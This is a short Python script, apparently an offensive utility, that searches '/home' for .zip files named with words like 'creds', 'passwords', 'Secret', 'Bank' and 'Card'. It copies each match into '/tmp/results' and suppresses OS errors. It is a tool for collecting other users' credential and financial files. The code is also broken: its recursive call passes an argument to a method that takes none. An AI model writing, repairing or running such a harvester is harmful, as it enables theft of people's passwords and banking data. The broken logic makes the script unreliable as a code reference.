import os
import shutil

class CredentialSearcher():
    @staticmethod
    def run():
        path = '/home'
        destination_directory = r"/tmp/results"
        if not os.path.exists(destination_directory):
            os.makedirs(destination_directory)
        specific_words = ['creds', 'passwords', 'pass', 'Creds','Credentials', 'Passwords', 'Pass','Secret','Secrets','Users','User','Bank','bank','Card','card','Credit','credit','money','Money']
        extenstion = '.zip'
        try:
            for item in os.listdir(path):
                full_path = os.path.join(path, item)
                if os.path.isdir(full_path):
                    CredentialSearcher.run(full_path)
                elif item.endswith(extenstion) and any(word.lower() in item.lower() for word in specific_words):
                    shutil.copy(full_path, os.path.join(destination_directory, item))
                    print(full_path)
        except OSError as e:
            pass


